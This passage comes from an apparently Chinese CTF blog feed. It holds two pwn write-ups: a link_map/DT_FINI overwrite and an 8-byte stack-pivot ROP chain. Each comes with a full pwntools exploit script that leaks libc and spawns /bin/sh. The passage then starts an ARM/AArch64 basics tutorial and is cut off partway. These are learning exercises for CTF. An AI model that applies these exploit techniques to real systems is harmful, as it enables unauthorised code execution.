class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x5625ff3e2000</span>     <span class="number">0x5625ff3e3000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e3000</span>     <span class="number">0x5625ff3e4000</span> r-xp     <span class="number">1000</span> <span class="number">1000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e4000</span>     <span class="number">0x5625ff3e5000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e5000</span>     <span class="number">0x5625ff3e6000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e6000</span>     <span class="number">0x5625ff3e7000</span> rw-p     <span class="number">1000</span> <span class="number">3000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff6b3000</span>     <span class="number">0x5625ff6d4000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7f2a72e98000</span>     <span class="number">0x7f2a72f99000</span> rw-p   <span class="number">101000</span> <span class="number">0</span>      [anon_7f2a72e98]</span><br><span class="line">    <span class="number">0x7f2a72f99000</span>     <span class="number">0x7f2a72fbb000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a72fbb000</span>     <span class="number">0x7f2a73133000</span> r-xp   <span class="number">178000</span> <span class="number">22000</span>  /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73133000</span>     <span class="number">0x7f2a73181000</span> r--p    <span class="number">4e000</span> <span class="number">19</span>a000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73181000</span>     <span class="number">0x7f2a73185000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73185000</span>     <span class="number">0x7f2a73187000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73187000</span>     <span class="number">0x7f2a7318d000</span> rw-p     <span class="number">6000</span> <span class="number">0</span>      [anon_7f2a73187]</span><br><span class="line">    <span class="number">0x7f2a7318d000</span>     <span class="number">0x7f2a7318e000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a7318e000</span>     <span class="number">0x7f2a731b1000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731b1000</span>     <span class="number">0x7f2a731b9000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731ba000</span>     <span class="number">0x7f2a731bb000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bb000</span>     <span class="number">0x7f2a731bc000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bc000</span>     <span class="number">0x7f2a731bd000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [anon_7f2a731bc]</span><br><span class="line">    <span class="number">0x7ffed494a000</span>     <span class="number">0x7ffed496b000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7ffed49f3000</span>     <span class="number">0x7ffed49f7000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffed49f7000</span>     <span class="number">0x7ffed49f9000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure><p>也就是说题目中的chunk附近任意读写可以转换为libc/ld任意读写</p><p>考虑到只有一次机会,所以显然是要在无泄漏的情况下完成利用,修改stdout等结构体是行不通的</p><p>此时一个思路就是修改link_map的fini函数,是的函数退出时执行题目给的后门</p><p>一开始想叉了,想直接修改DT_FINI_ARRAY到DT_INIT_ARRAY,然后l_addr修改为9直接进入后门</p><p>但是发现这样会使得找fini_array的时候访问段错误,因为是从9+0x3d88找</p><p>所以最后还是选择修改DT_FINI使其指向0x3d80处,然后DT_FINI_ARRAY修改为NULL,l_addr保持为9</p><p>这样最后就会直接调用后门</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,content</span>):</span><br><span class="line">    content = <span class="built_in">list</span>(content)</span><br><span class="line">    payload = <span class="string">&quot;@&quot;</span> + p32(addr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        payload += <span class="string">&#x27;.&#x27;</span> + p8(<span class="built_in">ord</span>(content[i]))</span><br><span class="line">        payload += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">0x100000</span>))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload = write(<span class="number">0x338180</span>,p64(<span class="number">9</span>))</span><br><span class="line">    payload += write(<span class="number">0xa8</span>-<span class="number">8</span>,<span class="string">b&#x27;\x80&#x27;</span>)</span><br><span class="line">    payload += write(<span class="number">0x67</span>,p64(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">    payload += <span class="string">&#x27;q&#x27;</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    binary = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">    context.binary = binary</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) == <span class="number">3</span>):</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(binary)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>这都是建立在存在后门的情况下,此外如果没有后门,但同样有system也是能做的</p><p>发现到执行fini函数时,rdi固定为一个指向ld上可读写的段,在此之前现在这个位置写上<code>/bin/sh</code>即可,其他的只需要l_addr修改为system@plt与.init中值的差值即可</p><p>不过对其他更普遍的题而言,没啥太大的借鉴性,毕竟都有任意写的能力了,不如用其他方法</p><h1 id="ez-overflow"><a href="#ez-overflow" class="headerlink" title="ez_overflow"></a>ez_overflow</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401176(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hear stack overflow is pretty easy?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数十分简单,开头的那个<code>sub_401176</code>用于设置缓冲区没什么好说的</p><p>之后就是一个栈溢出但只能溢出8字节</p><p>第一思路肯定是栈迁移然后再次返回到read处,事实也确实如此</p><p>不过我们一次只能写0x18字节,这其中还包括了下一次需要使用的rbp和保存地址</p><p>因此真正有效的只有8个字节</p><p>那么显然是要多次调用read每次写8个字节,一步步布置rop流</p><p>第一次尝试的时候犯了一个错误,就是如果写完8字节之后直接跳转前往布置下一个8字节,就会因为栈迁移交替使得rbp与rsp靠的太近,从而写这一次rop流时会覆盖call read时保存的返回地址,进而段错误</p><p>解决办法就是每一次写完8个字节后,就将栈抬高到别处去,然后才再次返回到布置rop处,总之就是让rsp与rbp距离远一点</p><p>就是常规的rop加了一点套路</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./ez&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401185</span></span><br><span class="line">leave_ret=<span class="number">0x401208</span></span><br><span class="line">bss1=<span class="number">0x404600</span></span><br><span class="line">bss2=<span class="number">0x404800</span></span><br><span class="line">main_read=<span class="number">0x4011ed</span></span><br><span class="line">ret=<span class="number">0x4010C4</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;easy?\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1)+p64(main_read))</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(bss2)+p64(main_read))<span class="comment">#这里binsh写早了,导致之后被覆盖了,但懒得改了</span></span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x8</span>)+p64(main_read))</span><br><span class="line">s(p64(bss2)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x10</span>)+p64(main_read))</span><br><span class="line">s(p64(pop_rdi_ret)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x18</span>)+p64(main_read))</span><br><span class="line">s(p64(<span class="number">0x403FE8</span>)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x20</span>)+p64(main_read))</span><br><span class="line">s(p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(bss2)+p64(main_read))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x28</span>)+p64(main_read))</span><br><span class="line">s(p64(<span class="number">0x4011ED</span>)+p64(bss1)+p64(leave_ret))</span><br><span class="line"></span><br><span class="line">read_addr=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x58</span>)+p64(main_read))</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x60</span>)+p64(main_read))</span><br><span class="line">s(p64(pop_rdi_ret)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x68</span>)+p64(main_read))</span><br><span class="line">s(p64(bss2+<span class="number">0x50</span>)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x70</span>)+p64(main_read))</span><br><span class="line">s(p64(ret)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x78</span>)+p64(main_read))</span><br><span class="line">s(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+p64(bss2)+p64(main_read))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x28</span>)+p64(main_read))</span><br><span class="line">s(p64(<span class="number">0x4011ED</span>)+p64(bss2+<span class="number">0x50</span>)+p64(leave_ret))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">有意思的题目</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="杂题" scheme="https://ixout.github.io/tags/%E6%9D%82%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>常见异架构基础</title>
    <link href="https://ixout.github.io/posts/36717/"/>
    <id>https://ixout.github.io/posts/36717/</id>
    <published>2023-12-03T11:19:57.000Z</published>
    <updated>2024-05-01T13:19:51.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h1><p>CTF比赛中，大部分题的都是x86、x86_64的程序，这类程序是属于Intel处理器支持的</p><p>   但其实，在生活中配置ARM处理器的设备要多得多，比如：Android、网络设备、智能家居等</p><p>Intel和ARM之间的区别主要是指令集</p><p>●CISC 复杂指令集</p><p>●RISC 精简指令集</p><p>   精简指令集通过减少每条指令的时钟周期来缩短执行时间，可以更快的执行指令，但因为指令较少，因此在实现功能时，会显得比Intel冗长</p><p>   其次，在x86上，大多数指令都可以直接对内存中的数据进行操作，而在ARM上，必须先将内存中的数据从内存移到寄存器中，然后再进行操作</p><hr><p>一般我们说的<code>arm</code>是<code>ARMv7</code>架构，是<code>32</code>位，而<code>aarch64</code>是<code>ARMv8</code>架构，也就是<code>64</code>位。</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="ARM32"><a href="#ARM32" class="headerlink" title="ARM32"></a>ARM32</h3><p>寄存器的数量取决于ARM版本，ARM32有30个通用寄存器（基于ARMv6-M和基于ARMv7-M的处理器除外），前16个寄存器可在用户级模式下访问，其他寄存器可在特权软件执行中使用</p><p>其中，r0-15寄存器可在任何特权模式下访问。这16个寄存器可以分为两组：通用寄存器（R0-R11）和专用寄存器（R12-R15）</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p><p><strong>普通寄存器</strong>R0-R12：可在常规操作期间用于存储临时值，指针（到存储器的位置）等，例如：</p><p>●<strong>R0</strong>在算术操作期间可称为累加器，或用于<strong>存储先前调用的函数的结果</strong></p><p>●<strong>R7</strong>在处理系统调用时非常有用，因为它<strong>存储系统调用号</strong></p><p>●<strong>R11</strong>帮助我们跟踪<strong>用作帧指针的堆栈的边界</strong></p><p>●ARM上的函数调用约定指定函数的前四个参数存储在寄存器<strong>r0</strong>-<strong>r3</strong>中</p><p><strong>特殊寄存器</strong></p><p><strong>R13</strong>：SP（堆栈指针）。堆栈指针指向堆栈的顶部。堆栈是用于函数特定存储的内存区域，函数返回时将对其进行回收。因此，通过从堆栈指针中减去我们要分配的值（以字节为单位），堆栈指针可用于在堆栈上分配空间。换句话说，如果我们要分配一个32位值，则从堆栈指针中减去4</p><p><strong>R14</strong>：LR（链接寄存器）。进行功能调用时，链接寄存器将使用一个内存地址进行更新，该内存地址引用了从其开始该功能的下一条指令。这样做可以使程序返回到“父”函数，该子函数在“子”函数完成后启动“子”函数调用</p><p><strong>R15</strong>：PC（程序计数器）。程序计数器自动增加执行指令的大小。在ARM状态下，此大小始终为4个字节，<strong>在THUMB模式下，此大小始终为2个字节。</strong>当执行转移指令时，PC保留目标地址。在执行期间，PC在ARM状态下存储当前指令的地址加8（<strong>两个ARM指令</strong>），在Thumb（v1）状态下存储当前指令的地址加4（<strong>两个Thumb指令</strong>）。这与x86不同，x86中PC始终指向要执行的下一条指令</p><p><strong>与x86平行对比</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/asdasdasd1.png" alt=""></p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>1.当参数少于4个时，子程序间通过寄存器R0~R3来传递参数；当参数个数多于4个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反,即从左到右，子程序返回前无需恢复R0~R3的值</p><p>2.在子程序中，使用R4~R11保存局部变量，<strong>若使用需要入栈保存</strong>，<strong>子程序返回前需要恢复这些寄存器</strong>；<u>R12是临时寄存器，使用不需要保存</u></p><p>3.R13用作数据帧指针，记作SP；R14用作链接寄存器，记作LR，<strong>用于保存子程序返回时的地址</strong>；R15是程序计数器，记作PC</p><p>4.ATPCS规定堆栈是满递减堆栈FD；</p><p>5.子程序返回32位的整数，使用R0返回；返回64位整数时，使用R0返回低位，R1返回高位</p><h3 id="AARCH64"><a href="#AARCH64" class="headerlink" title="AARCH64"></a>AARCH64</h3><p>AARCH64也即64位的ARM，从ARMv8开始才有。ARMv8分为aarch32和aarch64两部分。</p><p><img src="https://toleleyjl.github.io/images/%E5%BC%82%E6%9E%84Pwn/pic06.png" alt=""></p><p>aarch64有31个通用寄存器:X0-X30</p><p>低 32 位可以通过 W0-W30 来访问. 当写入 Wy 时, Xy 的高 32 位会被置 0。</p><p><img src="https://toleleyjl.github.io/images/%E5%BC%82%E6%9E%84Pwn/pic07.png" alt=""></p><p>AARCH64标准提供了8个通用寄存器（X0~X7）用于传递函数参数，依次对应于前8个函数参数。超过8个的参数使用堆栈进行参数传递。</p><p>函数的返回值用通用寄存器X0来保存。</p><h3 id="32与64位差异"><a href="#32与64位差异" class="headerlink" title="32与64位差异"></a>32与64位差异</h3><p>​    arm32下，前4个参数是通过r0~r3传递，第4个参数需要通过sp访问，第5个参数需要通过sp + 4 访问，第n个参数需要通过sp + 4*(n-4)访问。</p><p>​    arm64下，前8个参数是通过x0~x7传递，第8个参数需要通过sp访问，第9个参数需要通过sp + 8 访问，第n个参数需要通过sp + 8*(n-8)访问。</p><p>​    ARM指令在32位下和在64位下并不是完全一致的，但大部分指令是通用的，特别的，” mov r2, r1, lsl #2”仅在ARM32下支持，它等同于ARM64的” lsl r2, r1, #2”</p><p>​    还有一些32位存在的指令在64位下是不存在的，比如vswp指令，条件执行指令subgt,addle等</p><p>arm指令集</p><h2 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h2><p>ARM处理器具有两种可以运行的主要状态（此处不包括Jazelle）：<strong>ARM和Thumb</strong></p><p>​    这两种状态之间的主要区别是指令集，<strong>其中ARM状态下的指令始终为32位，Thumb状态下的指令始终为16位（但可以为32位）</strong></p><p>​    现在，ARM引入了增强的Thumb指令集（Thumbv2），该指令集允许32位Thumb指令甚至条件执行，而在此之前的版本中是不可能的，为了在Thumb状态下使用条件执行，引入了“ it”指令。但是，这个指令在后来的版本中被删除并替换成了其他的</p><p>​    在编写ARM shellcode时，我们需要摆脱NULL字节，并使用16位Thumb指令而不是32位ARM指令来减少使用它们的机会。</p><p><strong>Thumb和ARM一样也有不同的版本：</strong></p><p>●Thumb-1（16位指令）：在ARMv6和更早的体系结构中使用</p><p>●Thumb-2（16位和32位指令）：通过添加更多指令并使它们的宽度为16位或32位（ARMv6T2，ARMv7）来扩展Thumb-1</p><p>●ThumbEE：包括一些针对动态生成的代码的更改和添加</p><p><strong>ARM和Thumb之间的区别：</strong></p><p>●条件执行：ARM状态下的所有指令均支持条件执行。某些ARM处理器版本允许使用“it”指令在Thumb中有条件执行。</p><p>●32位ARM和Thumb指令：32位Thumb指令带有.w后缀。</p><p>●桶式移位器（barrel shifter）是ARM模式的另一个独特功能。它可以用于将多个指令缩小为一个。例如，您可以使用左移，而不是使用两条指令，将寄存器乘以2并使用mov将结果存储到另一个寄存器中：mov r1, r0, lsl #1 ; r1 = r0 * 2</p><p><strong>切换处理器执行的状态</strong></p><p>必须满足以下两个条件之一：</p><p>●我们可以使用分支指令BX（分支和交换）或BLX（分支，链接和交换）并将目标寄存器的最低有效位设置为1。这可以通过在偏移量上加上1来实现，例如0x5530 + 1。可能会认为这会导致对齐问题，因为指令是2字节或4字节对齐的。这不是问题，因为处理器将忽略最低有效位</p><p>●我们知道如果当前程序状态寄存器中的T位置1，则我们处于Thumb模式。</p><h3 id="ARM指令初识"><a href="#ARM指令初识" class="headerlink" title="ARM指令初识"></a>ARM指令初识</h3><p>汇编语言由指令构成，而指令是主要的构建块。ARM指令通常后跟一个或两个操作数，并且通常使用以下模板：</p><p>​    MNEMONIC {S} {condition} {Rd}，Operand1，Operand2</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/sadasd3.png" alt=""></p><p>​    注意，由于ARM指令集的灵活性，并非所有指令都使用模板中提供的所有字段。其中，条件字段与CPSR寄存器的值紧密相关，或者确切地说，与寄存器内特定位的值紧密相关</p><p>Operand2被称为灵活操作数，因为我们可以以多种形式使用它，例如，我们可以将这些表达式用作Operand2：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/213asda.png" alt=""></p><p>下面以一些常见指令为例：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/%E5%9B%BE%E7%89%875.png" alt=""></p><h4 id="ARM常用指令"><a href="#ARM常用指令" class="headerlink" title="ARM常用指令"></a>ARM常用指令</h4><div class="table-container"><table><thead><tr><th><strong>指令</strong></th><th><strong>描述</strong></th><th><strong>指令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>MOV</td><td>移动数据</td><td>EOR</td><td>按位异或</td></tr><tr><td>MVN</td><td>移动并取反</td><td>LDR</td><td>加载</td></tr><tr><td>ADD</td><td>加</td><td>STR</td><td>存储</td></tr><tr><td>SUB</td><td>减</td><td>LDM</td><td>加载多个</td></tr><tr><td>MUL</td><td>乘</td><td>STM</td><td>存储多个</td></tr><tr><td>LSL</td><td>逻辑左移</td><td>PUSH</td><td>入栈</td></tr><tr><td>LSR</td><td>逻辑右移</td><td>POP</td><td>出栈</td></tr><tr><td>ASR</td><td>算术右移</td><td>B</td><td>跳转</td></tr><tr><td>ROR</td><td>右旋</td><td>BL</td><td>Link跳转</td></tr><tr><td>CMP</td><td>比较</td><td>BX</td><td>分支跳转</td></tr><tr><td>AND</td><td>按位与</td><td>BLX</td><td>使用Link分支跳转</td></tr><tr><td>ORR</td><td>按位或</td><td>SWI/SVC</td><td>系统调用</td></tr></tbody></table></div><h5 id="LDR-和-STR"><a href="#LDR-和-STR" class="headerlink" title="LDR 和 STR"></a>LDR 和 